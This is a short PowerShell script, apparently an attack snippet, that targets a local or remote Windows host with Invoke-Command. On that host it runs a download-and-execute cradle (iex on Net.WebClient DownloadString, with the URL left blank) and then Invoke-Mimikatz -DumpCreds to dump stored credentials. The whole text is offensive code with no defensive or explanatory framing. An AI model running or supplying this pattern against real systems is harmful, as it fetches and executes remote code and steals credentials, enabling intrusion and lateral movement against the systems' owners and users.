#IP of target: . for local, ip for remote
$IP="."

Invoke-Command -Computername $Ip {iex((New-Object Net.WebClient).DownloadString('')); Invoke-Mimikatz -DumpCreds}